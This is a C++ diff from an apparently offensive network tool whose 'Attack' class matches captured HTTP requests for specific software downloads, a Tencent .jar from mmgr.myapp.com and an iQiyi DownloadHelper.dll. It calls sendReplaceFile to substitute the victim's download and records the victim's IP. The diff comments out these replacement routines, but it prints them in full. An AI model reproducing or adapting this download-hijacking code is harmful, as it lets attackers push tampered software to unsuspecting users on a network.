@@ -20,7 +20,7 @@ Attack::Attack(string path, unsigned long serverIP) {
 
 	int iRet = 0;
 
-	gIqiyiDll = new ReplaceNetFile(path + "DownloadHelper.dll", "application/octet-stream");
+	//gIqiyiDll = new ReplaceNetFile(path + "DownloadHelper.dll", "application/octet-stream");
 
 	//gDnsAttack = new DnsAttack(serverIP, "", "");
 
@@ -34,12 +34,12 @@ int Attack::attack(const char* url, const char* szhost, const char* lphttpdata, 
 	char* ip, int type, LPPPPOEHEADER pppoe) {
 	int iRet = 0;
 
-	if (strstr(szhost, "mmgr.myapp.com") && strstr(url, "/myapp/wesecure_apk/kingcardext/kcsdk_") && strstr(url, ".jar"))
-	{
-		iRet = mQQPim->sendReplaceFile(pcapT, (char*)pData, iCapLen, ip, type, pppoe);
-		printf("qqpim jar\r\n");
-		Public::recorduser(((LPIPHEADER)ip)->SrcIP, "qqpim jar");
-	}
+	//if (strstr(szhost, "mmgr.myapp.com") && strstr(url, "/myapp/wesecure_apk/kingcardext/kcsdk_") && strstr(url, ".jar"))
+	//{
+	//	iRet = mQQPim->sendReplaceFile(pcapT, (char*)pData, iCapLen, ip, type, pppoe);
+	//	printf("qqpim jar\r\n");
+	//	Public::recorduser(((LPIPHEADER)ip)->SrcIP, "qqpim jar");
+	//}
 	// 	else if (strstr(szhost, "static.qiyi.com") && strstr(url, "/ext/common/qisu2/DownloadHelper.dll") )
 	// 	{
 	// 		iRet = gIqiyiDll->sendReplaceFile(pcapT, (char*)pData, iCapLen, ip, type, pppoe);
